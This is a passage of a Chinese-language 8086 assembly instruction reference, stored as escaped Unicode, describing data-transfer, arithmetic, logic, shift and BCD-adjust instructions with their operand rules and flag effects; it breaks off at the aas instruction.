\u5982\u679c\u6307\u4ee4\u4e2d\u6ca1\u6709\u6807\u5fd7\u4f4d\u8868\u683c\uff0c\u5219\u8be5\u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\u3002\u53f3\u659c\u7ebf\u8868\u793a\u8be5\u6807\u5fd7\u4f4d\u7531\u7ed3\u679c\u51b3\u5b9a\uff0c\u5168\u90e8\u586b\u5145\u4e3a\u6839\u636e\u7279\u6b8a\u610f\u4e49\u8bbe\u5b9a\uff08\u6ce8\u610f\u4e2d\u4f1a\u5177\u4f53\u8bf4\uff09\uff0c\u6253\u53c9\u4e3a undefined\uff08\u4e00\u822c\u4e0d\u53d8\uff09 \u6570\u636e\u4f20\u9001\u6307\u4ee4 \u00b6 \u901a\u7528\u6570\u636e\u4f20\u9001\u6307\u4ee4 \u00b6 mov \u6307\u4ee4\u683c\u5f0f \uff1amov a, b \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 b \u7684\u503c\u4f20\u5165 a \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0cb \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u3001\u903b\u8f91\u5730\u5740\u6216\u7acb\u5373\u6570\uff0c\u4f46 a b \u6700\u591a\u6709\u4e00\u4e2a\u662f\u903b\u8f91\u5730\u5740\uff0c\u4e14\u5982\u679c\u662f\u5c06\u7acb\u5373\u6570\u4f20\u5165\u903b\u8f91\u5730\u5740\u6240\u6307\u5185\u5b58\u65f6\u8981\u6807\u6ce8\u5927\u5c0f\uff08byte ptr / word ptr\uff09\uff0c\u5e76\u4e14 a b \u5bbd\u5ea6\u9700\u4e00\u81f4\u3002\u4e0d\u80fd\u628a\u7acb\u5373\u6570\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\uff0c\u4e5f\u4e0d\u80fd\u628a\u6bb5\u5bc4\u5b58\u5668\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d push \u6307\u4ee4\u683c\u5f0f \uff1apush a \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 a \u538b\u5165\u6808\uff0c\u5373 sp = sp - 2, word ptr ss:[sp] = a \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u5185\u5bb9\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e0d\u80fd\u662f fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d pop \u6307\u4ee4\u683c\u5f0f \uff1apop a \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u6808\u4e0a\u5f39\u51fa 16 \u4f4d\u6570\u503c\u5230 a \u4e2d\uff0c\u5373 a = word ptr ss:[sp], sp = sp + 2 \u6ce8\u610f \uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f cs fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d xchg \u6307\u4ee4\u683c\u5f0f \uff1axchg op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ea4\u6362 op1 op2\uff0c\u5373 tmp = op1, op1 = op2, op2 = tmp \u6ce8\u610f \uff1aop1 op2 \u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\uff0c\u4e0d\u80fd\u90fd\u662f\u5185\u5b58\uff0c\u4e14\u4e0d\u80fd\u662f\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d \u7aef\u53e3\u8f93\u5165\u8f93\u51fa\u6307\u4ee4 \u00b6 in \u6307\u4ee4\u683c\u5f0f \uff1ain acc, port \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u7aef\u53e3\u8bfb\u6570\u636e\u5230 al \u6216 ax \u4e2d\uff0c\u5373 acc = [port]\uff08\u7aef\u53e3\u4e2d\u5185\u5bb9\uff09 \u6ce8\u610f \uff1aacc \u4e00\u5b9a\u662f al \u6216 ax\uff0cport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u6700\u5927 0FFh\u3002\u662f ax \u5219 [port] \u5b58\u5165 al\uff0c[port+1] \u5b58\u5165 ah out \u6307\u4ee4\u683c\u5f0f \uff1aout port, acc \u6307\u4ee4\u4f5c\u7528 \uff1a\u628a al \u6216 ax \u4e2d\u503c\u5199\u5165\u7aef\u53e3\uff0c\u5373 [port] = acc \u6ce8\u610f \uff1aport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff08\u7acb\u5373\u6570\u6700\u5927 0FFh\uff09\uff0cacc \u4e00\u5b9a\u662f al \u6216 ax\u3002\u662f ax \u5219 al \u5199\u5165 [port]\uff0cah \u5199\u5165 [port+1] \u5730\u5740\u4f20\u9001\u6307\u4ee4 \u00b6 lea \u6307\u4ee4\u683c\u5f0f \uff1alea dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u7684\u6709\u6548\u5730\u5740\u4f20\u5165 dest\uff0c\u5373 dest = offset src \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5185\u5b58\u53d8\u91cf\u3002\u53d6 src \u7684\u504f\u79fb\u5730\u5740 lds \u6307\u4ee4\u683c\u5f0f \uff1alds dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ds:dest\uff0c\u5373 dest = word ptr [src], ds = word ptr [src+2] \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58 les \u6307\u4ee4\u683c\u5f0f \uff1ales dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 es:dest\uff0c\u5373 dest = word ptr [src], es = word ptr [src+2] \u6ce8\u610f \uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58 \u6807\u5fd7\u5bc4\u5b58\u5668\u4f20\u9001\u6307\u4ee4 \u00b6 lahf \u6307\u4ee4\u683c\u5f0f \uff1alahf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 fl \u4f4e 8 \u4f4d\u590d\u5236\u5230 ah\uff0c\u5373 ah = fl & 0FFh sahf \u6307\u4ee4\u683c\u5f0f \uff1asahf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 ah \u5b58\u5165 fl \u4f4e 8 \u4f4d\uff0c\u5373 fl = (fl & 0FF00h) | 2 | (ah & 0D5h) \u6ce8\u610f \uff1a\u53ea\u4fdd\u7559 ah \u7684 0 2 4 6 7 \u4f4d\uff08cf pf af zf sf\uff09\uff0c\u4e14\u7b2c 1 \u4f4d\u6052\u4e3a 1 OF DF IF TF SF ZF AF PF CF pushf \u6307\u4ee4\u683c\u5f0f \uff1apushf \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 fl \u538b\u5165\u5806\u6808\uff0c\u5373 push fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\uff09 popf \u6307\u4ee4\u683c\u5f0f \uff1apopf \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece\u5806\u6808\u5f39\u51fa 16 \u4f4d\u5230 fl\uff0c\u5373 pop fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c OF DF IF TF SF ZF AF PF CF \u8f6c\u6362\u6307\u4ee4 \u00b6 \u7b26\u53f7\u6269\u5145\u6307\u4ee4 \u00b6 cbw \u6307\u4ee4\u683c\u5f0f \uff1acbw \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u5b57\u8282 al \u6269\u5145\u4e3a\u5b57 ax\uff0c\u5373\u5c06 al \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 ah cwd \u6307\u4ee4\u683c\u5f0f \uff1acwd \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u5b57 ax \u6269\u5145\u4e3a\u53cc\u5b57 dx:ax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 ax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 dx xlat \u6307\u4ee4\u683c\u5f0f \uff1axlat \u6307\u4ee4\u4f5c\u7528 \uff1a\u6362\u7801\u6307\u4ee4\uff0cal = byte ptr ds:[bx+al] \u6ce8\u610f \uff1a\u4e00\u822c\u4f7f ds:bx \u6307\u5411\u4e00\u5f20\u8868\uff0c\u7136\u540e\u529f\u80fd\u5373\u7c7b\u4f3c\u5217\u8868\u7d22\u5f15\u53d6\u503c \u7b97\u6570\u6307\u4ee4 \u00b6 \u52a0\u6cd5\u6307\u4ee4 \u00b6 add \u6307\u4ee4\u683c\u5f0f \uff1aadd dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 src \u52a0\u5230 dest \u4e0a\uff0c\u5373 dest += src \u6ce8\u610f \uff1asrc \u53ef\u4ee5\u662f\u7acb\u5373\u6570/\u5bc4\u5b58\u5668/\u5185\u5b58\uff0cdest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668/\u5185\u5b58\uff0c\u4f46\u4e8c\u8005\u4e0d\u80fd\u90fd\u4e3a\u5185\u5b58\uff0c\u5bbd\u5ea6\u8981\u4e00\u81f4\u3002\u53ef\u80fd\u4f1a\u4ea7\u751f\u8fdb\u4f4d\uff08cf\uff09\u548c\u6ea2\u51fa\uff08of\uff09 OF DF IF TF SF ZF AF PF CF inc \u6307\u4ee4\u683c\u5f0f \uff1ainc op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 op \u52a0\u4e00\uff0c\u5373 op += 1 \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d OF DF IF TF SF ZF AF PF CF adc \u6307\u4ee4\u683c\u5f0f \uff1aadc dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u52a0\uff0c\u5373 dest = dest + src + cf \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u89c4\u5219\u4e0e add \u76f8\u540c\uff0c\u53ef\u4ee5\u7528\u4e8e\u6a21\u62df 32 \u4f4d\u52a0\u6cd5 OF DF IF TF SF ZF AF PF CF \u51cf\u6cd5\u6307\u4ee4 \u00b6 sub \u6307\u4ee4\u683c\u5f0f \uff1asub dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece dest \u51cf\u53bb src\uff0c\u5373 dest -= src \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0c\u4f1a\u4ea7\u751f\u6ea2\u51fa\uff08of\uff09\uff0c\u501f\u4f4d\u4e5f\u4f1a\u4f7f cf \u53d8 1 OF DF IF TF SF ZF AF PF CF sbb \u6307\u4ee4\u683c\u5f0f \uff1asbb dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u501f\u4f4d\u51cf\uff0cdest = dest - src - cf \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add OF DF IF TF SF ZF AF PF CF dec \u6307\u4ee4\u683c\u5f0f \uff1adec op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 op \u51cf\u4e00\uff0c\u5373 op -= 1 \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d OF DF IF TF SF ZF AF PF CF neg \u6307\u4ee4\u683c\u5f0f \uff1aneg op \u6307\u4ee4\u4f5c\u7528 \uff1aop = -op \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u975e\u96f6\u6570\u6c42\u8865\u540e cf=1\uff0c0 \u6c42\u8865\u540e cf=0 OF DF IF TF SF ZF AF PF CF cmp \u6307\u4ee4\u683c\u5f0f \uff1acmp op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u7528 op1 \u51cf op2\uff0c\u4f46\u4e22\u5f03\u7ed3\u679c\u53ea\u5f71\u54cd\u6807\u5fd7\u4f4d \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c sub\uff0c\u7528\u4e8e\u5728 jump \u6307\u4ee4\u524d\u7ed9\u51fa\u7b26\u53f7\u4f4d\u4f5c\u4e3a\u6761\u4ef6\u5224\u65ad\u4f9d\u636e\u3002 OF DF IF TF SF ZF AF PF CF \u4e58\u6cd5\u6307\u4ee4 \u00b6 mul \u6307\u4ee4\u683c\u5f0f \uff1amul src \u6307\u4ee4\u4f5c\u7528 \uff1a\u975e\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u5f53 src \u4e3a 8 \u4f4d\u65f6 ax = al * src\uff0c\u5f53 src \u4e3a 16 \u4f4d\u65f6 dx:ax = ax * src \u6ce8\u610f \uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u5982\u679c\u9ad8\u4f4d\uff08\u4e00\u534a\uff09\u662f 0\uff0c\u5219\u5c06 of cf \u7f6e 0\uff0c\u5426\u5219\u7f6e 1 OF DF IF TF SF ZF AF PF CF imul \u6307\u4ee4\u683c\u5f0f \uff1aimul src \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u4e58\u6cd5\u65b9\u5f0f\u540c mul\uff0c\u4f46\u5c06\u4e24\u4e2a\u4e58\u6570\u548c\u79ef\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570 OF DF IF TF SF ZF AF PF CF \u9664\u6cd5\u6307\u4ee4 \u00b6 div \u6307\u4ee4\u683c\u5f0f \uff1adiv op \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u7b26\u53f7\u6570\u9664\u6cd5 \u5f53 op \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / op, ah = ax % op \u5f53 op \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / op, dx = dx:ax % op \u6ce8\u610f \uff1aop \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u53ef\u4ee5\u5f97\u5230\u5546\u548c\u4f59\u6570 OF DF IF TF SF ZF AF PF CF idiv \u6307\u4ee4\u683c\u5f0f \uff1aidiv \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b26\u53f7\u6570\u9664\u6cd5\uff0c\u9664\u6cd5\u64cd\u4f5c\u540c div\uff0c\u4f46\u5c06\u9664\u6570\u3001\u88ab\u9664\u6570\u3001\u5546\u548c\u4f59\u6570\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570 OF DF IF TF SF ZF AF PF CF \u903b\u8f91\u8fd0\u7b97\u6307\u4ee4 \u00b6 and \u6307\u4ee4\u683c\u5f0f \uff1aand dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u4e0e\u8fd0\u7b97\uff0cdest = dest & src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF or \u6307\u4ee4\u683c\u5f0f \uff1aor dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u6216\u8fd0\u7b97\uff0cdest = dest | src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF xor \u6307\u4ee4\u683c\u5f0f \uff1axor dest, src \u6307\u4ee4\u4f5c\u7528 \uff1a\u6309\u4f4d\u5f02\u6216\u8fd0\u7b97\uff0cdest = dest ^ src, of=0, cf=0 \u6ce8\u610f \uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf OF DF IF TF SF ZF AF PF CF not \u6307\u4ee4\u683c\u5f0f \uff1anot op \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 op \u6309\u4f4d\u6c42\u53cd\uff0cop = ~op \u6ce8\u610f \uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58 test \u6307\u4ee4\u683c\u5f0f \uff1atest op1, op2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4d\u6d4b\u8bd5\uff0cop1 & op2 \u4e22\u5f03\u7ed3\u679c\u4ec5\u5f71\u54cd\u7b26\u53f7\u4f4d \u6ce8\u610f \uff1a\u4e3b\u8981\u7528\u5230 zf \u7684\u53d8\u5316\uff0c\u4e3a jz jnz \u63d0\u4f9b zf OF DF IF TF SF ZF AF PF CF \u79fb\u4f4d\u6307\u4ee4 \u00b6 shl \u6307\u4ee4\u683c\u5f0f \uff1ashl dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u903b\u8f91\u5de6\u79fb count \u4f4d\uff0c\u53f3\u4fa7\u8865 0\uff0c\u5de6\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF shr \u6307\u4ee4\u683c\u5f0f \uff1ashr dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u903b\u8f91\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF sal \u6307\u4ee4\u683c\u5f0f \uff1asal dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u7b97\u6570\u5de6\u79fb count \u4f4d\uff0c\u540c\u903b\u8f91\u5de6\u79fb \u6ce8\u610f \uff1a\u4e0e shl \u5b8c\u5168\u76f8\u540c \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF sar \u6307\u4ee4\u683c\u5f0f \uff1asar dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u7b97\u6570\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09 \u6807\u5fd7\u4f4d \uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined OF DF IF TF SF ZF AF PF CF rol \u6307\u4ee4\u683c\u5f0f \uff1arol dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u5faa\u73af\u5de6\u79fb count \u4f4d\uff0c\u6700\u9ad8\u4f4d\u56de\u5230\u6700\u4f4e\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF ror \u6307\u4ee4\u683c\u5f0f \uff1aror dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5bf9 dest \u5faa\u73af\u53f3\u79fb count \u4f4d\uff0c\u6700\u4f4e\u4f4d\u56de\u5230\u6700\u9ad8\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF rcl \u6307\u4ee4\u683c\u5f0f \uff1arcl dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u5de6\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u5de6\u4fa7\u4e00\u8d77\u5faa\u73af\u5de6\u79fb \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF rcr \u6307\u4ee4\u683c\u5f0f \uff1arcr dest, count \u6307\u4ee4\u4f5c\u7528 \uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u53f3\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u53f3\u4fa7\u4e00\u8d77\u5faa\u73af\u53f3\u79fb \u6ce8\u610f \uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216 OF DF IF TF SF ZF AF PF CF \u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4 \u00b6 BCD \u7801\u662f\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u5341\u8fdb\u5236\u6570\uff0c\u53ef\u4ee5\u5206\u4e3a\u538b\u7f29 BCD \u7801\u548c\u975e\u538b\u7f29 BCD \u7801 \u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4 \u00b6 \u538b\u7f29 BCD \u7801\u5373\u662f\u4f7f\u7528 4 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u5982 37h \u8868\u793a 37\u3002\u4e0e\u8fd9\u4e9b\u6307\u4ee4\u76f8\u5173\u7684\u662f af \u6807\u5fd7\uff0c\u5b83\u5728\u52a0\u51cf\u6cd5\u65f6\u5982\u679c\u4f4e\u56db\u4f4d\u548c\u9ad8\u56db\u4f4d\u95f4\u53d1\u751f\u4e86\u5341\u516d\u8fdb\u5236\u8fdb\u4f4d\u5219\u53d8\u4e3a 1\u3002\u56e0\u6b64\u4e5f\u4f1a\u6b63\u597d\u5dee 6\uff0cdaa das \u4f5c\u7528\u5219\u662f\u5c06\u8fd9\u4e2a 6 \u8c03\u6574\u56de\u6765\uff0c\u4f7f\u7ed3\u679c\u7ee7\u7eed\u4e3a\u538b\u7f29 BCD \u7801 daa \u6307\u4ee4\u683c\u5f0f \uff1adaa \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801 if (af == 1 || (al&0Fh) > 9) al += 6, af = 1; else af = 0 if (cf == 1 || al > 9Fh) al += 60h, cf = 1; else cf = 0 OF DF IF TF SF ZF AF PF CF das \u6307\u4ee4\u683c\u5f0f \uff1adas \u6307\u4ee4\u4f5c\u7528 \uff1a\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u5c06\u7ed3\u679c al \u8c03\u6574\u4e3a BCD \u7801 if (af == 1 || (al&0Fh) > 9) al -= 6, af = 1; else af = 0 if (cf == 1 || al > 9Fh) al -= 60h, cf = 1; else cf = 0 OF DF IF TF SF ZF AF PF CF \u975e\u538b\u7f29 BCD \u7801\u8c03\u6574\u6307\u4ee4 \u00b6 \u975e\u538b\u7f29 BCD \u7801\u4f7f\u7528 8 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\u8868\u793a 1 \u4e2a\u5341\u8fdb\u5236\u4f4d\uff0c\u5176\u4e2d\u9ad8 4 \u4f4d\u6ca1\u6709\u610f\u4e49\uff0c\u6bd4\u5982 06h 16h 26h \u5747\u8868\u793a\u5341\u8fdb\u5236\u6570 6 aaa \u6307\u4ee4\u683c\u5f0f \uff1aaaa \u6307\u4ee4\u4f5c\u7528 \uff1a\u52a0\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u52a0\u6cd5\u540e\u8fde\u5e26 ah \u4e00\u8d77\u8c03\u6574 ax \u4e3a\u975e\u538b\u7f29 BCD \u7801 if (af == 1 || (al&0Fh) > 9) al = (al+6)&0Fh, ah += 1, af = 1, cf = 1 else af = 0, cf = 0 OF DF IF TF SF ZF AF PF CF \u4f8b mov ah , 0 mov al , ' 8 ' ; al = 38h add al , ' 9 ' ; al = 38h + 39h = 71h, af = 1, cf = 0 aaa ; ax = 0107h \u5373 17 mov ax , 0505 h ; 55 add al , 9 ; al = 0Eh, af = 0, cf = 0 aaa ; ax = 0604h \u5373 64 aas \u6307\u4ee4\u683c\u5f0f \uff1aaas \u6307\u4ee4\u4f5c\u7528 \uff1a\u51cf\u6cd5\u7684 ASCII \u8c03\u6574\uff0c\u5728 al \u88ab\u505a\u51cf\u6cd5\u540e\u8fde\u5e26 ah 